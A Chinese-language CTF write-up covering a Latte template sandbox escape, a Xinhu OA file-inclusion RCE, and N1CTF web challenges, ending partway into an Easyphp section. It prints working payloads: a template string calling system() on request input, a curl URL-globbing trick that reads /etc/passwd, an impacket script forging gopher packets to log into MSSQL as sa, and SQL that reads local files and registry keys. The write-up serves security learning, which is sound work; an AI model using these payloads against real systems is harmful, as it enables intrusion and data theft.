<h3 id="EZupload"><a href="#EZupload" class="headerlink" title="EZupload"></a>EZupload</h3><p>打latte这个PHP渲染引擎，说起来，这个引擎在文档上表现的非常安全，以及他们自己也说他们是注重安全的模板引擎，提供了一系列的安全解决方案。。。确实就从这个角度上看挺安全的，说实话，我觉得挖个这个洞还蛮有意思的，能想出来应该也很强吧</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">require</span> <span class="token string">'vendor/autoload.php'</span><span class="token punctuation">;</span>
<span class="token variable">$latte</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Latte<span class="token punctuation">\</span>Engine</span><span class="token punctuation">;</span>
<span class="token variable">$latte</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setTempDirectory</span><span class="token punctuation">(</span><span class="token string">'tempdir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$policy</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Latte<span class="token punctuation">\</span>Sandbox<span class="token punctuation">\</span>SecurityPolicy</span><span class="token punctuation">;</span>
<span class="token variable">$policy</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">allowMacros</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'else'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$policy</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">allowFilters</span><span class="token punctuation">(</span><span class="token variable">$policy</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$policy</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">allowFunctions</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'trim'</span><span class="token punctuation">,</span> <span class="token string">'strlen'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$latte</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setPolicy</span><span class="token punctuation">(</span><span class="token variable">$policy</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$latte</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setSandboxMode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$latte</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAutoRefresh</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$file_conents</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">28</span> <span class="token keyword">or</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file_conents</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>基本上就是文档里默认推荐的保护策略全开，还限制了文件名和内容，关了setAutoRefresh，题目只渲染index.latte，两分钟重置一次环境，就得等环境重置之后直接上传，防止其渲染默认模板之后打不了。</p>
<p>这个模板简单试了一下，渲染的时候会直接生成一个index.latte–xxxxx.php的文件，<code>&#123;expr&#125;</code>里的expr会直接作为参数传入一个escapeHtmlText函数，大概长这样<br><code>echo LR\Filters::escapeHtmlText(expr) /* line 1 */;</code><br>模板外的内容会直接用单引号包裹起来echo出来，并且都做了充分的转义，<code>// #</code>这两个注释符被禁用了，反引号也不给用</p>
<p>一开始发现<code>/*</code>是可以用的，并且似乎成功注释掉了后面的括号并逃逸了出去。。。然后无论如何都闭合不回来了，他的括号一定要成对，而一旦成对就会觉得你在调用函数，一是过不了黑名单，二是成对也没法闭合，放在字符串里的括号也会被正确的解析不能拿来闭合。一开始从这就跑偏了，到最后都没做出来呜呜</p>
<p>赛后看wp来研究这个模板引擎，这个模板的会对输入内容进行语法分析，基本上就是直接把整个表达式的内容进行一个eval，但对形如<code>$a($b)</code>这种的动态调用都会被当做函数调用解析，被改写为<code>$this-&gt;call($a)($b)</code>的形式并在call函数内被安全策略检查，不过双引号包裹的内容似乎会直接被复制粘贴过来。<br>但直接<code>&#123;&quot;expr&quot;&#125;</code>的话，解析引擎就不把这个内容当做模板，而是直接连引号带大括号的直接echo出来了</p>
<p>然后就有师傅发现了他还有一个<code>&#123;=expr&#125;</code>的模板语法，这个语法和<code>&#123;expr&#125;</code>并无区别，但允许expr开头不是变量或函数，就允许开头是字符串了，然后再用双引号字符串内的变量可以被解析进行动态调用<br>payload<br><code>&#123;=&quot;$&#123;system($_GET[1])&#125;&quot;&#125;</code><br>我一开始非常愚蠢的试了试<code>&#123;=&quot;$_GET[1]($_GET[2])&quot;&#125;</code>，还在想为什么这样子不成功。。。。后来才意识到这里的括号可没有其他的语义，双引号内只是解析变量罢了，硬是要解析的话可以再套一层<code>&#123;=&quot;$&#123;$_GET[1]($_GET[2])&#125;&quot;&#125;</code></p>
<h4 id="额外测试"><a href="#额外测试" class="headerlink" title="额外测试"></a>额外测试</h4><p>额外做了些无聊的测试，因为这个绕过的原因在于该模板引擎对字符串内的内容不做处理，而双引号字符串内的内容可以被解析造成的。一定要用<code>&#123;=expr&#125;</code>这个形式吗，倒也不一定，<code>&#123;expr&#125;</code>不能用是因为如果表达式的开头不是变量或函数，整个字符串就不会被当做模板去渲染，所以开头随便定义个变量，或者随便调用个函数，再拼接一个双引号字符串上去，一样能打通。<br>例如<code>&#123;$a.&quot;$&#123;$_GET[1]($_GET[2])&#125;&quot;&#125;</code>也是可以的</p>
<h3 id="OA-RCE"><a href="#OA-RCE" class="headerlink" title="OA?RCE?"></a>OA?RCE?</h3><p>今天闲下来之后决定再认真看一下，起码要简单的能够对框架类代码进行阅读，然后给我读麻了，我觉得这个哥哥能写出来这么大一堆垃圾就证明应该也有点能力，为什么要用拼音究极命名呢，各种拼音缩写，是在代码命名层面对代码进行混淆吗。给我看麻了</p>
<p>网上还能搜到两个对应的RCE，不过不知道还能不能打<br><a href="https://www.freebuf.com/articles/web/286380.html">通读审计之信呼OA</a><br><a href="https://422926799.github.io/posts/3541f020.html">信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</a></p>
<p>这个破烂框架最有意思的是还在持续更新，前两天又发布了一版更新。大无语事件，能不能把变量名和函数名之类的起规范一点？</p>
<p>直接看别人的wp是怎么打的<br>在View.php的末尾理论上是在进行模板的渲染，直接include了一个文件<br><code>include_once($mpathname);</code><br>这个变量可以通过如下方式赋值<br><code>if($xhrock-&gt;displayfile!=&#39;&#39; &amp;&amp; file_exists($xhrock-&gt;displayfile))$mpathname = $xhrock-&gt;displayfile</code><br>$xhrock是一个Action类，全局搜索displayfile这个变量，找到在两个action类中进行赋值<br>一个是index&#x2F;indexAction的getshtmlAction方法，能够include任意PHP文件<br>另一个是task&#x2F;mode&#x2F;modeAction的defaultAction方法，能够include任意HTML文件<br>显然是任意PHP文件比较靠谱，在裸文件包含且限定后缀的情况下，打一个pearcmd进行任意文件写，写一个shell之后再进行包含</p>
<p>至于怎么调用这个方法，就需要自行阅读一下某些垃圾代码了，mpda几个参数对应module project directory action</p>
<h2 id="N1"><a href="#N1" class="headerlink" title="N1"></a>N1</h2><p>Null的题目，好像也不是特别难嘛.jpg。反正我就签了个到</p>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>文档题，控制了一堆东西，总之就是输入一个数据，这个数据用date函数处理过之后得到的内容作为文件名去读<br>翻一下PHP manual就能知道，date运行输入普通字符串，在前面加个斜线转义即可<br><code>\/\f\l\a\g</code></p>
<h3 id="Funny-web"><a href="#Funny-web" class="headerlink" title="Funny_web"></a>Funny_web</h3><p>给了个hint说环境不是用docker起的，暂且未理解这个hint的意思，一个带过滤加escapeshellarg的curl</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//hint in /hint.txt</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$uuid</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span>
        <span class="token punctuation">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span>
        <span class="token punctuation">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span>
        <span class="token punctuation">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span>
        <span class="token punctuation">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$uuid</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Check</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token string">"/l|g|[\x01-\x1f]|[\x7f-\xff]|['\"]/i"</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span>
        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"uuid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"uuid"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">echo</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"uuid"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Check</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"/usr/bin/curl ${url} --output - -m 3 --connect-timeout 3"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"your command: "</span> <span class="token punctuation">.</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"uuid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"you cannot get the result~"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>需要输出的结果中带有生成的uuid才能看到回显，并且在check函数里过滤了<code>lg</code>两个字符，理论上来说file和gopher协议就不可用了，然而真的是这样吗<br>还是翻手册，直接开curl的man手册，能看到如下内容</p>
<blockquote>
<p>You can specify multiple URLs or parts of URLs by writing part<br>sets within braces and quoting the URL as in:<br>“<a href="http://site.{one,two,three}.com&quot;/">http://site.{one,two,three}.com&quot;</a><br>or you can get sequences of alphanumeric series by using [] as<br>in:<br>“<a href="ftp://ftp.example.com/file[1-100].txt&quot;">ftp://ftp.example.com/file[1-100].txt&quot;</a><br>“<a href="ftp://ftp.example.com/file[001-100].txt&quot;">ftp://ftp.example.com/file[001-100].txt&quot;</a>    (with leading zeros)<br>“<a href="ftp://ftp.example.com/file[a-z].txt&quot;">ftp://ftp.example.com/file[a-z].txt&quot;</a></p>
</blockquote>
<p>支持一个中括号来表示范围，大括号来枚举内容，虽然例子里没有给，但是不如试试能不能用中括号来修改协议字段？<br><code>fi[k-m]e:///etc/passwd</code>，似乎完全可以，不过本地测试的时候这样子会报错说我中括号没闭合，非常奇怪，乱按一下，再加一个步长，顺利搞定<br><code>fi[j-m:2]e:///etc/passwd</code><br>并且会有类似于这样子的输出</p>
<pre><code>[1/2]: fije:///etc/passwd --&gt; &lt;stdout&gt;
--_curl_--fije:///etc/passwd
curl: (6) Could not resolve host: fije

[2/2]: file:///etc/passwd --&gt; &lt;stdout&gt;
--_curl_--file:///etc/passwd
root:x:0:0:root:/root:/bin/bash
......
</code></pre>
<p>输入的文件名也被输出了出来，那么只要把token当做一个目录加进去，再跳出来即可先读取到注释中提到的hint.txt</p>
<p>hint.txt是给出了一个内网的mssql账户和密码，而密码，是2k行的uuid。。。我一开始还以为是mssql的什么特殊加密方式，想了想感觉是出题人希望我们能自己写一个产生对应数据流的工具。。。去遍历这2k个密码</p>
<p>思路倒是没什么问题，用gopher手搓数据流，然后自动化生成2000个对应的gopher包，总有一个能打通，至于回显问题，也很好解决，大括号不仅能枚举部分内容，还能直接枚举两个链接，就像这样<br><code>&#123;file:///etc/passwd,http://www.baidu.com&#125;</code><br>协议不同也没关系，所以可以自己vps上放个uuid，再用gopher打，也可以用之前提到的file会回显，整个目录打，也可以直接去读tmp下的那个session文件，方法很多</p>
<p>那么接下来就是手搓数据了，先起了个mssql的docker（我一直以为这个东西只能在windows上跑来这），然后本地连一下看看情况，发现密码是密文传输的，并且每次的包还不一样，不能抄一个模板然后直接替换了。。。<br>然后，我去微软翻了一眼文档，然后被究极数据结构劝退，网上找python连mssql的库，有是有，但是他只负责连，也不能只生成数据，翻源码，发现这个玩意还编译到了字节码，翻不到。。。<br><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec">[MS-TDS]: Tabular Data Stream Protocol</a><br>然后最后只能docker起一个服务，然后用python去连，再写一个python脚本监听网卡。。。把数据抓出来。。。吐了</p>
<p>可这并不是最惨的，因为搜一下gopher打mssql，发现几年前有一个类似的题，但是那个题的账户密码是已知的，就只要本地生成一个流量打过去就行了，所以工作量不大，可以手动，现在我需要自动化，在我把我写的破烂缝合起来自动化之后，我发现，我把流量缝合起来一整个gopher打过去之后，server给我应答了一个prelogin的响应包。。。按照网上的文章应该缝合起来一波就可以完成prelogin+login+query的。心态爆炸，躺平了</p>
<p>嗯，看了出题人的官方wp，他自己手搓了这整个数据结构，那我也无话可说了，试了一下，确实能一个包打通，既然如此，就是我的缝合代码有问题了，不过出题人提到有一个叫impacket的库封装了这套数据结构，我直接抄过来缝合，并写出一套代码（出题人的脚本用python2写的，多多少少有点用不习惯，这个已经写好了整个数据结构的封装起来用应该也更灵活更鲁棒吧）</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> impacket<span class="token punctuation">.</span>tds <span class="token keyword">import</span> <span class="token operator">*</span>


<span class="token keyword">def</span> <span class="token function">url_encode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%%%02x'</span> <span class="token operator">%</span> c <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">gene_packet</span><span class="token punctuation">(</span>packetType<span class="token punctuation">,</span> data<span class="token punctuation">,</span> packetID<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tds <span class="token operator">=</span> TDSPacket<span class="token punctuation">(</span><span class="token punctuation">)</span>
    tds<span class="token punctuation">[</span><span class="token string">'Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> packetType
    tds<span class="token punctuation">[</span><span class="token string">'Status'</span><span class="token punctuation">]</span> <span class="token operator">=</span> TDS_STATUS_EOM
    tds<span class="token punctuation">[</span><span class="token string">'PacketID'</span><span class="token punctuation">]</span> <span class="token operator">=</span> packetID
    tds<span class="token punctuation">[</span><span class="token string">'Data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data
    <span class="token keyword">return</span> tds


username <span class="token operator">=</span> <span class="token string">"sa"</span>
password <span class="token operator">=</span> <span class="token string">"9fb8da74-5186-4471-9ee5-155539f84e14"</span>
<span class="token comment" spellcheck="true"># database = "master"</span>
database <span class="token operator">=</span> None
server <span class="token operator">=</span> <span class="token string">"ip"</span>
port <span class="token operator">=</span> <span class="token number">1433</span>
mssql <span class="token operator">=</span> MSSQL<span class="token punctuation">(</span>server<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
query <span class="token operator">=</span> <span class="token string">"SELECT 'HELLO WORLD!!'"</span>

<span class="token comment" spellcheck="true"># prelogin packet</span>
prelogin <span class="token operator">=</span> TDS_PRELOGIN<span class="token punctuation">(</span><span class="token punctuation">)</span>
prelogin<span class="token punctuation">[</span><span class="token string">'Version'</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x08\x00\x01\x55\x00\x00"</span>
prelogin<span class="token punctuation">[</span><span class="token string">'Encryption'</span><span class="token punctuation">]</span> <span class="token operator">=</span> TDS_ENCRYPT_NOT_SUP
prelogin<span class="token punctuation">[</span><span class="token string">'ThreadID'</span><span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;L'</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
prelogin<span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">'MSSQLServer\x00'</span>
pre_tds <span class="token operator">=</span> gene_packet<span class="token punctuation">(</span>TDS_PRE_LOGIN<span class="token punctuation">,</span> prelogin<span class="token punctuation">.</span>getData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># login packet</span>
login <span class="token operator">=</span> TDS_LOGIN<span class="token punctuation">(</span><span class="token punctuation">)</span>
login<span class="token punctuation">[</span><span class="token string">'HostName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span>
login<span class="token punctuation">[</span><span class="token string">'AppName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span>
login<span class="token punctuation">[</span><span class="token string">'ServerName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> mssql<span class="token punctuation">.</span>server<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span>
login<span class="token punctuation">[</span><span class="token string">'CltIntName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> login<span class="token punctuation">[</span><span class="token string">'AppName'</span><span class="token punctuation">]</span>
login<span class="token punctuation">[</span><span class="token string">'ClientPID'</span><span class="token punctuation">]</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span>
login<span class="token punctuation">[</span><span class="token string">'PacketSize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> mssql<span class="token punctuation">.</span>packetSize
<span class="token keyword">if</span> database <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
    login<span class="token punctuation">[</span><span class="token string">'Database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> database<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span>
login<span class="token punctuation">[</span><span class="token string">'OptionFlags2'</span><span class="token punctuation">]</span> <span class="token operator">=</span> TDS_INIT_LANG_FATAL <span class="token operator">|</span> TDS_ODBC_ON
login<span class="token punctuation">[</span><span class="token string">'UserName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span>
login<span class="token punctuation">[</span><span class="token string">'Password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> mssql<span class="token punctuation">.</span>encryptPassword<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
login<span class="token punctuation">[</span><span class="token string">'SSPI'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span>
login_tds <span class="token operator">=</span> gene_packet<span class="token punctuation">(</span>TDS_LOGIN7<span class="token punctuation">,</span> login<span class="token punctuation">.</span>getData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># query packet</span>
query_tds <span class="token operator">=</span> gene_packet<span class="token punctuation">(</span>TDS_SQL_BATCH<span class="token punctuation">,</span> <span class="token punctuation">(</span>query <span class="token operator">+</span> <span class="token string">";-- -"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"gopher://"</span> <span class="token operator">+</span> server <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/_"</span> <span class="token operator">+</span> url_encode<span class="token punctuation">(</span>
    pre_tds<span class="token punctuation">.</span>getData<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> login_tds<span class="token punctuation">.</span>getData<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> query_tds<span class="token punctuation">.</span>getData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>嗯，成功连上了自己的docker并查询了数据，感觉是能用了，然后再从网上抄一个读文件的payload</p>
<pre class=" language-mssql"><code class="language-mssql">create table result(res varchar(8000));
bulk insert result from '/etc/passwd';
select * from result
</code></pre>
<p>Linux上的docker就读这个好了。题目是读注册表，不知道是不是一个原理，不过起码应该后续不会有坑了，算打通了吧</p>
<p>比赛的时候知道这个库就好了呜呜</p>
<p>看了r3的wp，感觉他们这个题是一个外国友人做的？他在文章里提到他用impacket写的脚本并连不上最新的mssql，不过我的docker镜像感觉还蛮新的，他也没贴脚本，不知道出入在哪，不过他似乎提到密码是直接明文传输的？在密码长度一致的情况下也不需要对数据包进行额外更改，所以直接抓一个流量包然后替换密码字段也能重放。。。我之前一直以为会用进行简单加密，比如prelogin请求就是用来协商密钥之类的。。</p>
<p>然后他给出了一个读注册表的命令</p>
<pre class=" language-mssql"><code class="language-mssql">EXECUTE master.sys.xp_regenumvalues 'HKEY_LOCAL_MACHINE','Software\N1CTF2021'
</code></pre>
<h3 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h3><p>not easy at all<br>是一个玄幻的写入phar文件然后进行phar反序列化的操作<br>题目给了两个文件，一个index.php可以判断一个文件是否存在，以及一个类，在析构的时候echo flag</p>
<pre class=" language-php"><code class="language-php">
<span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">//include_once "flag.php";</span>
<span class="token keyword">CLASS</span> <span class="token class-name">FLAG</span> <span class="token punctuation">{</span>
